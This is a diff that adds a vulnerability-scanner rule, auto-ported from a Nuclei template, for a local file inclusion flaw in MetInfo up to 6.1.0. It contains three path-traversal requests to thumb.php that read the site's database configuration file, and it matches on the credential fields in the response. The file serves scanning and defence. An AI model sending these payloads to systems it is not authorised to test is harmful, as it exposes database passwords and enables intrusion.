@@ -1,0 +1,46 @@
+schema_version: 1
+id: "cortex.community:metinfo-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "MetInfo <=6.1.0 - Local File Inclusion"
+  description: "MetInfo 6.0.0 through 6.1.0 is vulnerable to local file inclusion and allows remote unauthenticated attackers access to locally stored files and their content. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://paper.seebug.org/676/"
+  cwes: [22]
+  tags: ["metinfo", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/include/thumb.php?dir=http/.....///.....///config/config_db.php" }
+  - id: "probe1"
+    request: { method: "GET", path: "/include/thumb.php?dir=.....///http/.....///config/config_db.php" }
+  - id: "probe2"
+    request: { method: "GET", path: "/include/thumb.php?dir=http\\\\..\\\\..\\\\config\\\\config_db.php" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    any:
+      - all:
+          - all:
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "con_db_pass" } }
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "con_db_name" } }
+          - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
+      - all:
+          - all:
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "con_db_pass" } }
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "con_db_name" } }
+          - eq: { left: { ref: "steps.probe1.status" }, right: { value: 200 } }
+      - all:
+          - all:
+              - contains: { left: { ref: "steps.probe2.body" }, right: { value: "con_db_pass" } }
+              - contains: { left: { ref: "steps.probe2.body" }, right: { value: "con_db_name" } }
+          - eq: { left: { ref: "steps.probe2.status" }, right: { value: 200 } }
